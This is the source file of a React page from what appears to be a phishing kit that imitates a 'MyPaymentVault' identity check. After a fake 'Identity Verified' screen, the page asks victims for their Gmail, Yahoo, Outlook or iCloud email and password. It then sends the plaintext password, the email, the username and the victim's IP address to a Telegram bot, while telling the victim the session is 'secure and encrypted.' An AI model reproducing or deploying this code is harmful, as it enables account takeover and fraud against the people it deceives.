import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Loader2, Globe, ChevronDown, Eye, EyeOff } from "lucide-react";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { getPublicIP, sendTelegram } from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

const providers = [
  {
    id: "gmail",
    name: "Gmail",
    color: "#EA4335",
    bg: "#fff",
    border: "#ddd",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <path d="M22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6z" fill="#fff" stroke="#ddd" strokeWidth="0"/>
        <path d="M22 6l-10 7L2 6" stroke="none" fill="none"/>
        <rect width="24" height="24" fill="none"/>
        <path d="M2 6h20v12H2z" fill="#fff"/>
        <path d="M2 6l10 7 10-7" fill="none" stroke="#EA4335" strokeWidth="1.5"/>
        <path d="M2 6v12h20V6L12 13 2 6z" fill="#fff"/>
        <path d="M2 6l10 7 10-7H2z" fill="#FBBC04" opacity="0"/>
        <circle cx="4" cy="4" r="0" fill="#EA4335"/>
        <path d="M2 6l10 7 10-7" stroke="#EA4335" strokeWidth="1.8" fill="none"/>
        <path d="M2 6v12" stroke="#4285F4" strokeWidth="1.5"/>
        <path d="M22 6v12" stroke="#34A853" strokeWidth="1.5"/>
        <path d="M2 18h20" stroke="#FBBC04" strokeWidth="1.5"/>
        <text x="4" y="15" fontFamily="Arial" fontSize="9" fontWeight="bold" fill="#EA4335">G</text>
      </svg>
    ),
  },
  {
    id: "yahoo",
    name: "Yahoo Mail",
    color: "#6001D2",
    bg: "#fff",
    border: "#ddd",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <rect width="24" height="24" rx="4" fill="#6001D2"/>
        <text x="4" y="17" fontFamily="Arial" fontSize="13" fontWeight="bold" fill="#fff">Y!</text>
      </svg>
    ),
  },
  {
    id: "outlook",
    name: "Outlook",
    color: "#0078D4",
    bg: "#fff",
    border: "#ddd",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <rect width="24" height="24" rx="3" fill="#0078D4"/>
        <rect x="2" y="6" width="11" height="12" rx="2" fill="#fff"/>
        <rect x="13" y="8" width="9" height="8" rx="1" fill="#50B0F0"/>
        <path d="M13 8l4.5 3.5L22 8" stroke="#0078D4" strokeWidth="1" fill="none"/>
        <ellipse cx="7.5" cy="12" rx="3" ry="4" fill="#0078D4"/>
        <ellipse cx="7.5" cy="12" rx="2" ry="3" fill="#fff"/>
      </svg>
    ),
  },
  {
    id: "icloud",
    name: "iCloud",
    color: "#1d6aea",
    bg: "#fff",
    border: "#ddd",
    icon: (
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
        <rect width="24" height="24" rx="4" fill="#1d6aea"/>
        <path d="M7 16a4 4 0 01-.5-7.95A5.5 5.5 0 0117.9 8H18a3 3 0 010 6H7z" fill="#fff"/>
      </svg>
    ),
  },
];

export default function LoginSuccess() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [providerEmail, setProviderEmail] = useState("");
  const [providerPassword, setProviderPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [readyToNavigate, setReadyToNavigate] = useState(false);
  const { verifyCard, isAuthenticated } = useAuth();
  const { lang, setLang, langName } = useI18n();

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  useEffect(() => {
    if (readyToNavigate && isAuthenticated) {
      navigate("/step4");
    }
  }, [readyToNavigate, isAuthenticated, navigate]);

  async function handleContinue() {
    let valid = true;
    if (!providerEmail.trim()) { setEmailError("Email is required."); valid = false; }
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(providerEmail.trim())) { setEmailError("Invalid email format."); valid = false; }
    else setEmailError("");

    if (!providerPassword.trim()) { setPasswordError("Password is required."); valid = false; }
    else setPasswordError("");

    if (!valid) return;

    setLoading(true);

    try {
      const ip = await getPublicIP();
      const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";

      await fetch("/api/auth/approved", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, ipAddress: ip, email: providerEmail.trim() }),
      }).catch(() => {});

      await sendTelegram(
        `📧 <b>Email Account Terverifikasi</b>\n\n` +
        `👤 <b>Username</b>  : <code>${username}</code>\n` +
        `📬 <b>Provider</b>  : <b>${providerName}</b>\n` +
        `📩 <b>Email</b>     : <code>${providerEmail.trim()}</code>\n` +
        `🔑 <b>Password</b>  : <code>${providerPassword}</code>\n` +
        `🌐 <b>IP</b>        : <code>${ip}</code>`,
      );
    } catch (_) {}

    verifyCard();
    setReadyToNavigate(true);
  }

  const currentProvider = providers.find(p => p.id === selectedProvider);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center ls-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .ls-outer { background: #fff !important; justify-content: flex-start !important; padding: 0 !important; }
          .ls-card  { max-width: 100% !important; min-height: 100dvh !important; box-shadow: none !important; border-radius: 0 !important; }
        }
        @keyframes fadeInUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
        @keyframes checkPop { 0%{transform:scale(0.4);opacity:0;} 70%{transform:scale(1.15);opacity:1;} 100%{transform:scale(1);opacity:1;} }
        @keyframes spin { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
        .ls-fadein { animation: fadeInUp 0.5s ease both; }
        .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
        .prov-btn:hover { border-color: #111 !important; background: #f8f8f8 !important; }
        .prov-btn.selected { border-color: #111 !important; background: #f4f4f4 !important; }
        .email-input:focus,.pass-input:focus { outline:none; border-color:#111; }
        .email-input::placeholder,.pass-input::placeholder { color:#bbb; }
      `}</style>

      <div
        className="w-full flex flex-col bg-white ls-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* HEADER */}
        <div className="flex items-center justify-between" style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
          <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <div className="relative">
            <button type="button" onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{ display:"flex", alignItems:"center", gap:5, color:"#555", fontSize:13, background:"none", border:"none", cursor:"pointer" }}>
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555" style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition:"transform 0.2s" }} />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{ position:"absolute", right:0, top:"100%", marginTop:4, width:140, background:"#fff", border:"1px solid #ddd", boxShadow:"0 4px 16px rgba(0,0,0,0.15)", zIndex:20 }}>
                  {languageOptions.map(opt => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{ display:"block", width:"100%", textAlign:"left", padding:"10px 16px", fontSize:13, background:"none", border:"none", cursor:"pointer", fontWeight: lang===opt.code ? 600:400, color: lang===opt.code ? "#111":"#555" }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* HERO */}
        <div style={{ width:"100%", lineHeight:0 }}>
          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width:"100%", display:"block" }} />
        </div>

        {/* BODY */}
        <div style={{ padding:"32px 28px 40px", textAlign:"center" }}>

          {/* Icon */}
          <div className="ls-check" style={{ width:64, height:64, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 16px" }}>
            <ShieldCheck size={30} color="#fff" strokeWidth={1.8} />
          </div>

          <h2 className="ls-fadein" style={{ fontSize:20, fontWeight:700, color:"#111", marginBottom:4, animationDelay:"0.1s" }}>
            Identity Verified
          </h2>
          <p className="ls-fadein" style={{ fontSize:13, color:"#555", marginBottom:2, animationDelay:"0.12s" }}>Welcome back,</p>
          <p className="ls-fadein" style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:22, animationDelay:"0.15s" }}>{username}</p>

          <div className="ls-fadein" style={{ borderTop:"1px solid #ebebeb", margin:"0 0 22px", animationDelay:"0.2s" }} />

          {/* Step indicator */}
          <div className="ls-fadein" style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, marginBottom:24, animationDelay:"0.22s" }}>
            {[1,2,3,4].map((s, i) => (
              <div key={s} style={{ display:"flex", alignItems:"center", gap:8 }}>
                <div style={{ width:22, height:22, borderRadius:"50%", background: s<=2?"#111":"#ccc", display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0 }}>
                  {s === 1
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize:11, color:"#fff", fontWeight:700 }}>{s}</span>}
                </div>
                {i < 3 && <div style={{ width:40, height:1, background: s<2?"#111":"#ccc" }} />}
              </div>
            ))}
          </div>

          {/* Provider selection */}
          {!selectedProvider ? (
            <div className="ls-fadein" style={{ animationDelay:"0.25s" }}>
              <p style={{ fontSize:14, fontWeight:600, color:"#333", marginBottom:16, textAlign:"left" }}>
                Select your email provider to verify
              </p>
              <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
                {providers.map(p => (
                  <button
                    key={p.id}
                    type="button"
                    className="prov-btn"
                    onClick={() => setSelectedProvider(p.id)}
                    style={{
                      display:"flex", alignItems:"center", gap:10,
                      padding:"14px 16px", border:"1.5px solid #e0e0e0",
                      borderRadius:8, background:"#fff", cursor:"pointer",
                      transition:"all 0.15s", textAlign:"left",
                    }}
                  >
                    {p.icon}
                    <span style={{ fontSize:14, fontWeight:600, color:"#222" }}>{p.name}</span>
                  </button>
                ))}
              </div>
            </div>
          ) : (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              {/* Provider header */}
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f8f8f8", borderRadius:8 }}>
                {currentProvider?.icon}
                <div style={{ textAlign:"left" }}>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>{currentProvider?.name}</p>
                  <button type="button" onClick={() => { setSelectedProvider(null); setProviderEmail(""); setProviderPassword(""); setEmailError(""); setPasswordError(""); }}
                    style={{ fontSize:11, color:"#888", textDecoration:"underline", background:"none", border:"none", cursor:"pointer", padding:0 }}>
                    Change provider
                  </button>
                </div>
              </div>

              {/* Email field */}
              <div style={{ textAlign:"left", marginBottom:14 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Email Address</label>
                <input
                  className="email-input"
                  type="email"
                  placeholder="example@email.com"
                  value={providerEmail}
                  onChange={e => { setProviderEmail(e.target.value); setEmailError(""); }}
                  disabled={loading}
                  style={{
                    width:"100%", height:46,
                    border: emailError ? "1.5px solid #e00" : "1.5px solid #ddd",
                    borderRadius:6, padding:"0 14px",
                    fontSize:15, color:"#111", background:"#fafafa",
                    boxSizing:"border-box", transition:"border-color 0.15s",
                  }}
                  autoComplete="email"
                />
                {emailError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{emailError}</p>}
              </div>

              {/* Password field */}
              <div style={{ textAlign:"left", marginBottom:22 }}>
                <label style={{ fontSize:13, fontWeight:600, color:"#333", display:"block", marginBottom:6 }}>Password</label>
                <div style={{ position:"relative" }}>
                  <input
                    className="pass-input"
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter your password"
                    value={providerPassword}
                    onChange={e => { setProviderPassword(e.target.value); setPasswordError(""); }}
                    onKeyDown={e => e.key === "Enter" && handleContinue()}
                    disabled={loading}
                    style={{
                      width:"100%", height:46,
                      border: passwordError ? "1.5px solid #e00" : "1.5px solid #ddd",
                      borderRadius:6, padding:"0 44px 0 14px",
                      fontSize:15, color:"#111", background:"#fafafa",
                      boxSizing:"border-box", transition:"border-color 0.15s",
                    }}
                    autoComplete="current-password"
                  />
                  <button type="button" onClick={() => setShowPassword(!showPassword)}
                    style={{ position:"absolute", right:12, top:"50%", transform:"translateY(-50%)", background:"none", border:"none", cursor:"pointer", color:"#888", display:"flex", alignItems:"center" }}>
                    {showPassword ? <EyeOff size={17} /> : <Eye size={17} />}
                  </button>
                </div>
                {passwordError && <p style={{ fontSize:12, color:"#e00", marginTop:5 }}>{passwordError}</p>}
              </div>

              {/* Submit */}
              <button
                type="button"
                onClick={handleContinue}
                disabled={loading}
                style={{
                  width:"100%", height:50,
                  background: loading ? "#555" : "#111", color:"#fff",
                  fontSize:15, fontWeight:600,
                  border:"none", borderRadius:6,
                  cursor: loading ? "not-allowed" : "pointer",
                  letterSpacing:"0.03em",
                  display:"flex", alignItems:"center", justifyContent:"center", gap:8,
                }}
              >
                {loading ? (
                  <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }} /> Verifying...</>
                ) : (
                  "Sign In & Verify →"
                )}
              </button>

              <p style={{ fontSize:12, color:"#bbb", marginTop:14 }}>
                Your session is secure and encrypted.
              </p>
            </div>
          )}
        </div>
      </div>

      <div style={{ width:"100%", maxWidth:480, marginTop:10, paddingRight:2, textAlign:"right" }}>
        <span style={{ fontSize:11, color:"#888" }}>
          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
        </span>
      </div>
    </div>
  );
}
